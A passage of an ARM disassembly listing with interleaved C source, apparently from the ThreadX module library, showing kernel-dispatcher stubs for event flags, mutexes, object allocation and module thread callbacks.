 8020742:	bf00      	nop
 8020744:	00000004 	.word	0x00000004

08020748 <_tx_event_flags_performance_system_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_event_flags_performance_system_info_get(ULONG *sets, ULONG *gets, ULONG *suspensions, ULONG *timeouts)
{
 8020748:	b590      	push	{r4, r7, lr}
 802074a:	b089      	sub	sp, #36	; 0x24
 802074c:	af00      	add	r7, sp, #0
 802074e:	60f8      	str	r0, [r7, #12]
 8020750:	60b9      	str	r1, [r7, #8]
 8020752:	607a      	str	r2, [r7, #4]
 8020754:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[2];

    extra_parameters[0] = (ALIGN_TYPE) suspensions;
 8020756:	687b      	ldr	r3, [r7, #4]
 8020758:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) timeouts;
 802075a:	683b      	ldr	r3, [r7, #0]
 802075c:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_EVENT_FLAGS_PERFORMANCE_SYSTEM_INFO_GET_CALL, (ALIGN_TYPE) sets, (ALIGN_TYPE) gets, (ALIGN_TYPE) extra_parameters);
 802075e:	4b08      	ldr	r3, [pc, #32]	; (8020780 <_tx_event_flags_performance_system_info_get+0x38>)
 8020760:	f859 3003 	ldr.w	r3, [r9, r3]
 8020764:	681c      	ldr	r4, [r3, #0]
 8020766:	68f9      	ldr	r1, [r7, #12]
 8020768:	68ba      	ldr	r2, [r7, #8]
 802076a:	f107 0314 	add.w	r3, r7, #20
 802076e:	2016      	movs	r0, #22
 8020770:	47a0      	blx	r4
 8020772:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 8020774:	69fb      	ldr	r3, [r7, #28]
}
 8020776:	4618      	mov	r0, r3
 8020778:	3724      	adds	r7, #36	; 0x24
 802077a:	46bd      	mov	sp, r7
 802077c:	bd90      	pop	{r4, r7, pc}
 802077e:	bf00      	nop
 8020780:	00000004 	.word	0x00000004

08020784 <_txe_event_flags_set>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_event_flags_set(TX_EVENT_FLAGS_GROUP *group_ptr, ULONG flags_to_set, UINT set_option)
{
 8020784:	b590      	push	{r4, r7, lr}
 8020786:	b087      	sub	sp, #28
 8020788:	af00      	add	r7, sp, #0
 802078a:	60f8      	str	r0, [r7, #12]
 802078c:	60b9      	str	r1, [r7, #8]
 802078e:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_EVENT_FLAGS_SET_CALL, (ALIGN_TYPE) group_ptr, (ALIGN_TYPE) flags_to_set, (ALIGN_TYPE) set_option);
 8020790:	4b07      	ldr	r3, [pc, #28]	; (80207b0 <_txe_event_flags_set+0x2c>)
 8020792:	f859 3003 	ldr.w	r3, [r9, r3]
 8020796:	681c      	ldr	r4, [r3, #0]
 8020798:	68f9      	ldr	r1, [r7, #12]
 802079a:	687b      	ldr	r3, [r7, #4]
 802079c:	68ba      	ldr	r2, [r7, #8]
 802079e:	2017      	movs	r0, #23
 80207a0:	47a0      	blx	r4
 80207a2:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 80207a4:	697b      	ldr	r3, [r7, #20]
}
 80207a6:	4618      	mov	r0, r3
 80207a8:	371c      	adds	r7, #28
 80207aa:	46bd      	mov	sp, r7
 80207ac:	bd90      	pop	{r4, r7, pc}
 80207ae:	bf00      	nop
 80207b0:	00000004 	.word	0x00000004

080207b4 <_txe_event_flags_set_notify>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_event_flags_set_notify(TX_EVENT_FLAGS_GROUP *group_ptr, VOID (*events_set_notify)(TX_EVENT_FLAGS_GROUP *))
{
 80207b4:	b590      	push	{r4, r7, lr}
 80207b6:	b085      	sub	sp, #20
 80207b8:	af00      	add	r7, sp, #0
 80207ba:	6078      	str	r0, [r7, #4]
 80207bc:	6039      	str	r1, [r7, #0]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_EVENT_FLAGS_SET_NOTIFY_CALL, (ALIGN_TYPE) group_ptr, (ALIGN_TYPE) events_set_notify, 0);
 80207be:	4b07      	ldr	r3, [pc, #28]	; (80207dc <_txe_event_flags_set_notify+0x28>)
 80207c0:	f859 3003 	ldr.w	r3, [r9, r3]
 80207c4:	681c      	ldr	r4, [r3, #0]
 80207c6:	6879      	ldr	r1, [r7, #4]
 80207c8:	683a      	ldr	r2, [r7, #0]
 80207ca:	2300      	movs	r3, #0
 80207cc:	2018      	movs	r0, #24
 80207ce:	47a0      	blx	r4
 80207d0:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80207d2:	68fb      	ldr	r3, [r7, #12]
}
 80207d4:	4618      	mov	r0, r3
 80207d6:	3714      	adds	r7, #20
 80207d8:	46bd      	mov	sp, r7
 80207da:	bd90      	pop	{r4, r7, pc}
 80207dc:	00000004 	.word	0x00000004

080207e0 <_txm_module_application_request>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT txm_module_application_request(ULONG request, ALIGN_TYPE param_1, ALIGN_TYPE param_2, ALIGN_TYPE param_3)
{
 80207e0:	b590      	push	{r4, r7, lr}
 80207e2:	b087      	sub	sp, #28
 80207e4:	af00      	add	r7, sp, #0
 80207e6:	60f8      	str	r0, [r7, #12]
 80207e8:	60b9      	str	r1, [r7, #8]
 80207ea:	607a      	str	r2, [r7, #4]
 80207ec:	603b      	str	r3, [r7, #0]

UINT   return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT)(_txm_module_kernel_call_dispatcher)(TXM_APPLICATION_REQUEST_ID_BASE+request, param_1, param_2, param_3);
 80207ee:	4b08      	ldr	r3, [pc, #32]	; (8020810 <_txm_module_application_request+0x30>)
 80207f0:	f859 3003 	ldr.w	r3, [r9, r3]
 80207f4:	681c      	ldr	r4, [r3, #0]
 80207f6:	68fb      	ldr	r3, [r7, #12]
 80207f8:	f503 3080 	add.w	r0, r3, #65536	; 0x10000
 80207fc:	683b      	ldr	r3, [r7, #0]
 80207fe:	687a      	ldr	r2, [r7, #4]
 8020800:	68b9      	ldr	r1, [r7, #8]
 8020802:	47a0      	blx	r4
 8020804:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 8020806:	697b      	ldr	r3, [r7, #20]
}
 8020808:	4618      	mov	r0, r3
 802080a:	371c      	adds	r7, #28
 802080c:	46bd      	mov	sp, r7
 802080e:	bd90      	pop	{r4, r7, pc}
 8020810:	00000004 	.word	0x00000004

08020814 <_txm_module_callback_request_thread_entry>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
VOID _txm_module_callback_request_thread_entry(ULONG id)
{
 8020814:	b580      	push	{r7, lr}
 8020816:	b098      	sub	sp, #96	; 0x60
 8020818:	af00      	add	r7, sp, #0
 802081a:	6078      	str	r0, [r7, #4]

    /* Disable warning of parameter not used. */
    TX_PARAMETER_NOT_USED(id);

    /* Pickup pointer to the request queue.  */
    request_queue =  _txm_module_entry_info -> txm_module_thread_entry_info_callback_request_queue;
 802081c:	4b2d      	ldr	r3, [pc, #180]	; (80208d4 <_txm_module_callback_request_thread_entry+0xc0>)
 802081e:	f859 3003 	ldr.w	r3, [r9, r3]
 8020822:	681b      	ldr	r3, [r3, #0]
 8020824:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8020826:	65bb      	str	r3, [r7, #88]	; 0x58
    /* Loop to process callback messages from the module manager.  */
    while(1)
    {

        /* Wait for the callback request for the module.  */
        status =  _txe_queue_receive(request_queue, (VOID *) &callback_message, TX_WAIT_FOREVER);
 8020828:	f107 030c 	add.w	r3, r7, #12
 802082c:	f04f 32ff 	mov.w	r2, #4294967295
 8020830:	4619      	mov	r1, r3
 8020832:	6db8      	ldr	r0, [r7, #88]	; 0x58
 8020834:	f000 fad8 	bl	8020de8 <_txe_queue_receive>
 8020838:	6578      	str	r0, [r7, #84]	; 0x54

        /* Check to see if a request was received.  */
        if (status != TX_SUCCESS)
 802083a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 802083c:	2b00      	cmp	r3, #0
 802083e:	d144      	bne.n	80208ca <_txm_module_callback_request_thread_entry+0xb6>
            /* This should not happen - get out of the loop.  */
            break;
        }

        /* Pickup the activation count in the message.  */
        activation_count =  callback_message.txm_module_callback_message_activation_count;
 8020840:	693b      	ldr	r3, [r7, #16]
 8020842:	65fb      	str	r3, [r7, #92]	; 0x5c

        /* Loop to call the callback function the correct number of times.  */
        while (activation_count)
 8020844:	e03d      	b.n	80208c2 <_txm_module_callback_request_thread_entry+0xae>
        {

            /* Decrement the activation count.  */
            activation_count--;
 8020846:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8020848:	3b01      	subs	r3, #1
 802084a:	65fb      	str	r3, [r7, #92]	; 0x5c

            /* Now dispatch the callback function.  */
            switch (callback_message.txm_module_callback_message_type)
 802084c:	68fb      	ldr	r3, [r7, #12]
 802084e:	2b04      	cmp	r3, #4
 8020850:	d836      	bhi.n	80208c0 <_txm_module_callback_request_thread_entry+0xac>
 8020852:	a202      	add	r2, pc, #8	; (adr r2, 802085c <_txm_module_callback_request_thread_entry+0x48>)
 8020854:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8020858:	441a      	add	r2, r3
 802085a:	4710      	bx	r2
 802085c:	00000015 	.word	0x00000015
 8020860:	00000023 	.word	0x00000023
 8020864:	00000033 	.word	0x00000033
 8020868:	00000043 	.word	0x00000043
 802086c:	00000053 	.word	0x00000053
            {

            case TXM_TIMER_CALLBACK:

                /* Setup timer callback pointer.  */
                timer_callback =  (void (*)(ULONG)) callback_message.txm_module_callback_message_application_function;
 8020870:	697b      	ldr	r3, [r7, #20]
 8020872:	643b      	str	r3, [r7, #64]	; 0x40

                /* Call application's timer callback.  */
                (timer_callback)((ULONG) callback_message.txm_module_callback_message_param_1);
 8020874:	69ba      	ldr	r2, [r7, #24]
 8020876:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8020878:	4610      	mov	r0, r2
 802087a:	4798      	blx	r3

                break;
 802087c:	e021      	b.n	80208c2 <_txm_module_callback_request_thread_entry+0xae>

            case TXM_EVENTS_SET_CALLBACK:

                /* Setup events set callback pointer.  */
                events_set_notify =  (void (*)(TX_EVENT_FLAGS_GROUP *)) callback_message.txm_module_callback_message_application_function;
 802087e:	697b      	ldr	r3, [r7, #20]
 8020880:	647b      	str	r3, [r7, #68]	; 0x44

                /* Call events set notify callback.  */
                (events_set_notify)((TX_EVENT_FLAGS_GROUP *) callback_message.txm_module_callback_message_param_1);
 8020882:	69bb      	ldr	r3, [r7, #24]
 8020884:	461a      	mov	r2, r3
 8020886:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8020888:	4610      	mov	r0, r2
 802088a:	4798      	blx	r3

                break;
 802088c:	e019      	b.n	80208c2 <_txm_module_callback_request_thread_entry+0xae>

            case TXM_QUEUE_SEND_CALLBACK:

                /* Setup queue send callback pointer.  */
                queue_send_notify =  (void (*)(TX_QUEUE *)) callback_message.txm_module_callback_message_application_function;
 802088e:	697b      	ldr	r3, [r7, #20]
 8020890:	64bb      	str	r3, [r7, #72]	; 0x48

                /* Call queue send notify callback.  */
                (queue_send_notify)((TX_QUEUE *) callback_message.txm_module_callback_message_param_1);
 8020892:	69bb      	ldr	r3, [r7, #24]
 8020894:	461a      	mov	r2, r3
 8020896:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8020898:	4610      	mov	r0, r2
 802089a:	4798      	blx	r3

                break;
 802089c:	e011      	b.n	80208c2 <_txm_module_callback_request_thread_entry+0xae>

            case TXM_SEMAPHORE_PUT_CALLBACK:

                /* Setup semaphore put callback pointer.  */
                semaphore_put_notify =  (void (*)(TX_SEMAPHORE *)) callback_message.txm_module_callback_message_application_function;
 802089e:	697b      	ldr	r3, [r7, #20]
 80208a0:	64fb      	str	r3, [r7, #76]	; 0x4c

                /* Call semaphore put notify callback.  */
                (semaphore_put_notify)((TX_SEMAPHORE *) callback_message.txm_module_callback_message_param_1);
 80208a2:	69bb      	ldr	r3, [r7, #24]
 80208a4:	461a      	mov	r2, r3
 80208a6:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 80208a8:	4610      	mov	r0, r2
 80208aa:	4798      	blx	r3

                break;
 80208ac:	e009      	b.n	80208c2 <_txm_module_callback_request_thread_entry+0xae>

            case TXM_THREAD_ENTRY_EXIT_CALLBACK:

                /* Setup thread entry/exit callback pointer.  */
                thread_entry_exit_notify =  (void (*)(TX_THREAD *, UINT)) callback_message.txm_module_callback_message_application_function;
 80208ae:	697b      	ldr	r3, [r7, #20]
 80208b0:	653b      	str	r3, [r7, #80]	; 0x50

                /* Call thread entry/exit notify callback.  */
                (thread_entry_exit_notify)((TX_THREAD *) callback_message.txm_module_callback_message_param_1, (UINT) callback_message.txm_module_callback_message_param_2);
 80208b2:	69bb      	ldr	r3, [r7, #24]
 80208b4:	4618      	mov	r0, r3
 80208b6:	69fa      	ldr	r2, [r7, #28]
 80208b8:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 80208ba:	4611      	mov	r1, r2
 80208bc:	4798      	blx	r3

                break;
 80208be:	e000      	b.n	80208c2 <_txm_module_callback_request_thread_entry+0xae>
                    /* Call the USBX callback function.  */
                    _txm_module_usbx_callback_request(&callback_message);
                }
#endif

                break;
 80208c0:	bf00      	nop
        while (activation_count)
 80208c2:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80208c4:	2b00      	cmp	r3, #0
 80208c6:	d1be      	bne.n	8020846 <_txm_module_callback_request_thread_entry+0x32>
        status =  _txe_queue_receive(request_queue, (VOID *) &callback_message, TX_WAIT_FOREVER);
 80208c8:	e7ae      	b.n	8020828 <_txm_module_callback_request_thread_entry+0x14>
            break;
 80208ca:	bf00      	nop
            }
        }
    }
}
 80208cc:	bf00      	nop
 80208ce:	3760      	adds	r7, #96	; 0x60
 80208d0:	46bd      	mov	sp, r7
 80208d2:	bd80      	pop	{r7, pc}
 80208d4:	00000008 	.word	0x00000008

080208d8 <_txm_module_object_allocate>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txm_module_object_allocate(VOID **object_ptr, ULONG object_size)
{
 80208d8:	b590      	push	{r4, r7, lr}
 80208da:	b085      	sub	sp, #20
 80208dc:	af00      	add	r7, sp, #0
 80208de:	6078      	str	r0, [r7, #4]
 80208e0:	6039      	str	r1, [r7, #0]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MODULE_OBJECT_ALLOCATE_CALL, (ALIGN_TYPE) object_ptr, (ALIGN_TYPE) object_size, 0);
 80208e2:	4b07      	ldr	r3, [pc, #28]	; (8020900 <_txm_module_object_allocate+0x28>)
 80208e4:	f859 3003 	ldr.w	r3, [r9, r3]
 80208e8:	681c      	ldr	r4, [r3, #0]
 80208ea:	6879      	ldr	r1, [r7, #4]
 80208ec:	2300      	movs	r3, #0
 80208ee:	683a      	ldr	r2, [r7, #0]
 80208f0:	205f      	movs	r0, #95	; 0x5f
 80208f2:	47a0      	blx	r4
 80208f4:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80208f6:	68fb      	ldr	r3, [r7, #12]
}
 80208f8:	4618      	mov	r0, r3
 80208fa:	3714      	adds	r7, #20
 80208fc:	46bd      	mov	sp, r7
 80208fe:	bd90      	pop	{r4, r7, pc}
 8020900:	00000004 	.word	0x00000004

08020904 <_txm_module_object_deallocate>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txm_module_object_deallocate(VOID *object_ptr)
{
 8020904:	b590      	push	{r4, r7, lr}
 8020906:	b085      	sub	sp, #20
 8020908:	af00      	add	r7, sp, #0
 802090a:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MODULE_OBJECT_DEALLOCATE_CALL, (ALIGN_TYPE) object_ptr, 0, 0);
 802090c:	4b07      	ldr	r3, [pc, #28]	; (802092c <_txm_module_object_deallocate+0x28>)
 802090e:	f859 3003 	ldr.w	r3, [r9, r3]
 8020912:	681c      	ldr	r4, [r3, #0]
 8020914:	6879      	ldr	r1, [r7, #4]
 8020916:	2300      	movs	r3, #0
 8020918:	2200      	movs	r2, #0
 802091a:	2060      	movs	r0, #96	; 0x60
 802091c:	47a0      	blx	r4
 802091e:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020920:	68fb      	ldr	r3, [r7, #12]
}
 8020922:	4618      	mov	r0, r3
 8020924:	3714      	adds	r7, #20
 8020926:	46bd      	mov	sp, r7
 8020928:	bd90      	pop	{r4, r7, pc}
 802092a:	bf00      	nop
 802092c:	00000004 	.word	0x00000004

08020930 <_txm_module_object_pointer_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txm_module_object_pointer_get(UINT object_type, CHAR *name, VOID **object_ptr)
{
 8020930:	b590      	push	{r4, r7, lr}
 8020932:	b087      	sub	sp, #28
 8020934:	af00      	add	r7, sp, #0
 8020936:	60f8      	str	r0, [r7, #12]
 8020938:	60b9      	str	r1, [r7, #8]
 802093a:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MODULE_OBJECT_POINTER_GET_CALL, (ALIGN_TYPE) object_type, (ALIGN_TYPE) name, (ALIGN_TYPE) object_ptr);
 802093c:	4b07      	ldr	r3, [pc, #28]	; (802095c <_txm_module_object_pointer_get+0x2c>)
 802093e:	f859 3003 	ldr.w	r3, [r9, r3]
 8020942:	681c      	ldr	r4, [r3, #0]
 8020944:	68ba      	ldr	r2, [r7, #8]
 8020946:	687b      	ldr	r3, [r7, #4]
 8020948:	68f9      	ldr	r1, [r7, #12]
 802094a:	205d      	movs	r0, #93	; 0x5d
 802094c:	47a0      	blx	r4
 802094e:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 8020950:	697b      	ldr	r3, [r7, #20]
}
 8020952:	4618      	mov	r0, r3
 8020954:	371c      	adds	r7, #28
 8020956:	46bd      	mov	sp, r7
 8020958:	bd90      	pop	{r4, r7, pc}
 802095a:	bf00      	nop
 802095c:	00000004 	.word	0x00000004

08020960 <_txm_module_object_pointer_get_extended>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txm_module_object_pointer_get_extended(UINT object_type, CHAR *name, UINT name_length, VOID **object_ptr)
{
 8020960:	b590      	push	{r4, r7, lr}
 8020962:	b089      	sub	sp, #36	; 0x24
 8020964:	af00      	add	r7, sp, #0
 8020966:	60f8      	str	r0, [r7, #12]
 8020968:	60b9      	str	r1, [r7, #8]
 802096a:	607a      	str	r2, [r7, #4]
 802096c:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[2];

    extra_parameters[0] = (ALIGN_TYPE) name_length;
 802096e:	687b      	ldr	r3, [r7, #4]
 8020970:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) object_ptr;
 8020972:	683b      	ldr	r3, [r7, #0]
 8020974:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MODULE_OBJECT_POINTER_GET_EXTENDED_CALL, (ALIGN_TYPE) object_type, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 8020976:	4b08      	ldr	r3, [pc, #32]	; (8020998 <_txm_module_object_pointer_get_extended+0x38>)
 8020978:	f859 3003 	ldr.w	r3, [r9, r3]
 802097c:	681c      	ldr	r4, [r3, #0]
 802097e:	68ba      	ldr	r2, [r7, #8]
 8020980:	f107 0314 	add.w	r3, r7, #20
 8020984:	68f9      	ldr	r1, [r7, #12]
 8020986:	205e      	movs	r0, #94	; 0x5e
 8020988:	47a0      	blx	r4
 802098a:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 802098c:	69fb      	ldr	r3, [r7, #28]
}
 802098e:	4618      	mov	r0, r3
 8020990:	3724      	adds	r7, #36	; 0x24
 8020992:	46bd      	mov	sp, r7
 8020994:	bd90      	pop	{r4, r7, pc}
 8020996:	bf00      	nop
 8020998:	00000004 	.word	0x00000004

0802099c <_txm_module_thread_shell_entry>:
/*                                                                        */
/*  10-15-2021      Scott Larson            Initial Version 6.1.9         */
/*                                                                        */
/**************************************************************************/
VOID  _txm_module_thread_shell_entry(TX_THREAD *thread_ptr, TXM_MODULE_THREAD_ENTRY_INFO *thread_info)
{
 802099c:	b580      	push	{r7, lr}
 802099e:	b084      	sub	sp, #16
 80209a0:	af00      	add	r7, sp, #0
 80209a2:	6078      	str	r0, [r7, #4]
 80209a4:	6039      	str	r1, [r7, #0]
#endif


    /* Determine if this is the start thread.  If so, we must prepare the module for
       execution.  If not, simply skip the C startup code.  */
    if (thread_info -> txm_module_thread_entry_info_start_thread)
 80209a6:	683b      	ldr	r3, [r7, #0]
 80209a8:	69db      	ldr	r3, [r3, #28]
 80209aa:	2b00      	cmp	r3, #0
 80209ac:	d01b      	beq.n	80209e6 <_txm_module_thread_shell_entry+0x4a>
    {
        /* Initialize the C environment.  */
        _gcc_setup(thread_info -> txm_module_thread_entry_info_code_base_address);
 80209ae:	683b      	ldr	r3, [r7, #0]
 80209b0:	68db      	ldr	r3, [r3, #12]
 80209b2:	4618      	mov	r0, r3
 80209b4:	f000 ff34 	bl	8021820 <_gcc_setup>
        
        /* Save the entry info pointer, for later use.  */
        _txm_module_entry_info =  thread_info;
 80209b8:	4b1b      	ldr	r3, [pc, #108]	; (8020a28 <_txm_module_thread_shell_entry+0x8c>)
 80209ba:	f859 3003 	ldr.w	r3, [r9, r3]
 80209be:	683a      	ldr	r2, [r7, #0]
 80209c0:	601a      	str	r2, [r3, #0]
        
        /* Save the kernel function dispatch address. This is used to make all resident calls from
           the module.  */
        _txm_module_kernel_call_dispatcher =  thread_info -> txm_module_thread_entry_info_kernel_call_dispatcher;
 80209c2:	683b      	ldr	r3, [r7, #0]
 80209c4:	6ada      	ldr	r2, [r3, #44]	; 0x2c
 80209c6:	4b19      	ldr	r3, [pc, #100]	; (8020a2c <_txm_module_thread_shell_entry+0x90>)
 80209c8:	f859 3003 	ldr.w	r3, [r9, r3]
 80209cc:	601a      	str	r2, [r3, #0]
        
        /* Ensure that we have a valid pointer.  */
        while (!_txm_module_kernel_call_dispatcher)
 80209ce:	bf00      	nop
 80209d0:	4b16      	ldr	r3, [pc, #88]	; (8020a2c <_txm_module_thread_shell_entry+0x90>)
 80209d2:	f859 3003 	ldr.w	r3, [r9, r3]
 80209d6:	681b      	ldr	r3, [r3, #0]
 80209d8:	2b00      	cmp	r3, #0
 80209da:	d0f9      	beq.n	80209d0 <_txm_module_thread_shell_entry+0x34>
               An error here typically indicates the resident portion of _tx_thread_schedule
               is not supporting the trap to obtain the function pointer.   */
        }
        
        /* Resume the module's callback thread, already created in the manager.  */
        _txe_thread_resume(thread_info -> txm_module_thread_entry_info_callback_request_thread);
 80209dc:	683b      	ldr	r3, [r7, #0]
 80209de:	6a1b      	ldr	r3, [r3, #32]
 80209e0:	4618      	mov	r0, r3
 80209e2:	f000 fca3 	bl	802132c <_txe_thread_resume>
    }

#ifndef TX_DISABLE_NOTIFY_CALLBACKS

    /* Pickup the entry/exit application callback routine.  */
    entry_exit_notify =  thread_info -> txm_module_thread_entry_info_exit_notify;
 80209e6:	683b      	ldr	r3, [r7, #0]
 80209e8:	699b      	ldr	r3, [r3, #24]
 80209ea:	60fb      	str	r3, [r7, #12]

    /* Determine if an application callback routine is specified.  */
    if (entry_exit_notify != TX_NULL)
 80209ec:	68fb      	ldr	r3, [r7, #12]
 80209ee:	2b00      	cmp	r3, #0
 80209f0:	d003      	beq.n	80209fa <_txm_module_thread_shell_entry+0x5e>
    {

        /* Yes, notify application that this thread has been entered!  */
        (entry_exit_notify)(thread_ptr, TX_THREAD_ENTRY);
 80209f2:	68fb      	ldr	r3, [r7, #12]
 80209f4:	2100      	movs	r1, #0
 80209f6:	6878      	ldr	r0, [r7, #4]
 80209f8:	4798      	blx	r3
    }
#endif

    /* Call current thread's entry function.  */
    (thread_info -> txm_module_thread_entry_info_entry) (thread_info -> txm_module_thread_entry_info_parameter);
 80209fa:	683b      	ldr	r3, [r7, #0]
 80209fc:	691b      	ldr	r3, [r3, #16]
 80209fe:	683a      	ldr	r2, [r7, #0]
 8020a00:	6952      	ldr	r2, [r2, #20]
 8020a02:	4610      	mov	r0, r2
 8020a04:	4798      	blx	r3


#ifndef TX_DISABLE_NOTIFY_CALLBACKS

    /* Pickup the entry/exit application callback routine again.  */
    entry_exit_notify =  thread_info -> txm_module_thread_entry_info_exit_notify;
 8020a06:	683b      	ldr	r3, [r7, #0]
 8020a08:	699b      	ldr	r3, [r3, #24]
 8020a0a:	60fb      	str	r3, [r7, #12]

    /* Determine if an application callback routine is specified.  */
    if (entry_exit_notify != TX_NULL)
 8020a0c:	68fb      	ldr	r3, [r7, #12]
 8020a0e:	2b00      	cmp	r3, #0
 8020a10:	d003      	beq.n	8020a1a <_txm_module_thread_shell_entry+0x7e>
    {

        /* Yes, notify application that this thread has exited!  */
        (entry_exit_notify)(thread_ptr, TX_THREAD_EXIT);
 8020a12:	68fb      	ldr	r3, [r7, #12]
 8020a14:	2101      	movs	r1, #1
 8020a16:	6878      	ldr	r0, [r7, #4]
 8020a18:	4798      	blx	r3
    }
#endif

    /* Call actual thread suspension routine.  */
    _txm_module_thread_system_suspend(thread_ptr);
 8020a1a:	6878      	ldr	r0, [r7, #4]
 8020a1c:	f000 f808 	bl	8020a30 <_txm_module_thread_system_suspend>
#ifdef TX_SAFETY_CRITICAL

    /* If we ever get here, raise safety critical exception.  */
    TX_SAFETY_CRITICAL_EXCEPTION(__FILE__, __LINE__, 0);
#endif
}
 8020a20:	bf00      	nop
 8020a22:	3710      	adds	r7, #16
 8020a24:	46bd      	mov	sp, r7
 8020a26:	bd80      	pop	{r7, pc}
 8020a28:	00000008 	.word	0x00000008
 8020a2c:	00000004 	.word	0x00000004

08020a30 <_txm_module_thread_system_suspend>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txm_module_thread_system_suspend(TX_THREAD *thread_ptr)
{
 8020a30:	b590      	push	{r4, r7, lr}
 8020a32:	b085      	sub	sp, #20
 8020a34:	af00      	add	r7, sp, #0
 8020a36:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_SYSTEM_SUSPEND_CALL, (ALIGN_TYPE) thread_ptr, 0, 0);
 8020a38:	4b07      	ldr	r3, [pc, #28]	; (8020a58 <_txm_module_thread_system_suspend+0x28>)
 8020a3a:	f859 3003 	ldr.w	r3, [r9, r3]
 8020a3e:	681c      	ldr	r4, [r3, #0]
 8020a40:	6879      	ldr	r1, [r7, #4]
 8020a42:	2300      	movs	r3, #0
 8020a44:	2200      	movs	r2, #0
 8020a46:	205c      	movs	r0, #92	; 0x5c
 8020a48:	47a0      	blx	r4
 8020a4a:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020a4c:	68fb      	ldr	r3, [r7, #12]
}
 8020a4e:	4618      	mov	r0, r3
 8020a50:	3714      	adds	r7, #20
 8020a52:	46bd      	mov	sp, r7
 8020a54:	bd90      	pop	{r4, r7, pc}
 8020a56:	bf00      	nop
 8020a58:	00000004 	.word	0x00000004

08020a5c <_txe_mutex_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_mutex_create(TX_MUTEX *mutex_ptr, CHAR *name_ptr, UINT inherit, UINT mutex_control_block_size)
{
 8020a5c:	b590      	push	{r4, r7, lr}
 8020a5e:	b089      	sub	sp, #36	; 0x24
 8020a60:	af00      	add	r7, sp, #0
 8020a62:	60f8      	str	r0, [r7, #12]
 8020a64:	60b9      	str	r1, [r7, #8]
 8020a66:	607a      	str	r2, [r7, #4]
 8020a68:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[2];

    extra_parameters[0] = (ALIGN_TYPE) inherit;
 8020a6a:	687b      	ldr	r3, [r7, #4]
 8020a6c:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) mutex_control_block_size;
 8020a6e:	683b      	ldr	r3, [r7, #0]
 8020a70:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MUTEX_CREATE_CALL, (ALIGN_TYPE) mutex_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) extra_parameters);
